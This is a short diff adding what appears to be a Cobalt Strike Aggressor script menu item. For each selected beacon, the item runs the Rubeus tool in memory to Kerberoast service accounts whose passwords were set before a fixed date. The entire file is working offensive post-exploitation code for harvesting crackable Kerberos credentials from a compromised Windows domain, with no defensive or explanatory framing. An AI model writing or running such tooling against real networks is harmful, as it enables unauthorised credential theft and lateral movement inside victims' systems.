@@ -1,0 +1,12 @@
+item "Rubeus - Kerberoast accts w/old Passwords"{
+			local('$bid');
+				foreach $bid ($1){
+					kerberoastoldpwd($bid);
+				}
+			}
+			
+			
+			
+sub kerberoastoldpwd{
+bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "kerberoast /pwdsetbefore:03-29-2019");
+}			
